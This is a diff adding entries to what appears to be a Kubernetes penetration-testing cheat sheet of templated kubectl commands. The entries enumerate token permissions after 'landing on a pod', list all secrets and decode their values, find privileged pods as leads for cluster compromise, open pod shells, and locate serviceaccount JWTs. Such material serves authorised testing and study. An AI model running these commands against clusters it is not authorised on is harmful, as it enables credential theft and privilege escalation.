@@ -266,3 +266,67 @@ kubectl run {{POD:str:pwn}} -n {{NAMESPACE:str:default}} --image {{IMAGE:str:alp
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=privesc,nodeselector,lateral,node -->
+
+## auth can-i sweep permissions
+Enumerate every action your current token / serviceaccount can actually perform. First thing to run after landing on a k8s pod.
+
+```bash
+kubectl auth can-i --list
+```
+
+<!-- meta: risk=low | phase=recon | tags=kubectl,auth,rbac,permissions -->
+
+---
+
+## list secrets all namespaces
+Every secret name across every namespace — namespace, name, and secret type. Doesn't show values (see the decode entry for that).
+
+```bash
+kubectl get secrets -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type'
+```
+
+<!-- meta: risk=low | phase=recon | tags=kubectl,secrets,list,namespaces -->
+
+---
+
+## extract secret decode base64
+Pull one secret and base64-decode every key in it, printing `key=value` lines.
+
+```bash
+kubectl get secret {{NAME:str}} -n {{NAMESPACE:str:default}} -o json | jq -r '.data | to_entries[] | "\(.key)=\(.value | @base64d)"'
+```
+
+<!-- meta: risk=medium | phase=post | tags=kubectl,secrets,decode,base64,extract -->
+
+---
+
+## find privileged pods dangerous configs
+Pods running with any of the four escape-friendly configs: privileged, hostNetwork, hostPID, or hostIPC. Immediate leads for cluster-wide compromise.
+
+```bash
+kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostNetwork==true or .spec.hostPID==true or .spec.hostIPC==true or ((.spec.containers // [])[].securityContext.privileged==true)) | "\(.metadata.namespace)/\(.metadata.name)"'
+```
+
+<!-- meta: risk=low | phase=recon | tags=kubectl,privileged,hostnetwork,hostpid,escape,pods -->
+
+---
+
+## exec shell into pod
+Drop into an interactive shell inside a pod. Uses `/bin/sh` for max compatibility — change to `/bin/bash` at fill time if the image has bash.
+
+```bash
+kubectl exec -it {{POD:str}} -n {{NAMESPACE:str:default}} -- /bin/sh
+```
+
+<!-- meta: risk=low | phase=post | tags=kubectl,exec,shell,pod,interactive -->
+
+---
+
+## list serviceaccount tokens all
+Every serviceaccount you can list — namespace + name. Use with `describe sa` to find the token secret name, then `get secret ... -o json | jq .data.token` to extract the actual JWT.
+
+```bash
+kubectl get sa -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SECRETS:.secrets[*].name'
+```
+
+<!-- meta: risk=low | phase=recon | tags=kubectl,serviceaccount,tokens,list -->
